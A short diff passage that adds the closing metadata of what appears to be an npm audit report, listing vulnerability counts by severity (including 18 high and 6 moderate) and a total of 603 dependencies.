+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 6,
+      "high": 18,
+      "critical": 0
+    },
+    "dependencies": 603,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 603
+  }
+}
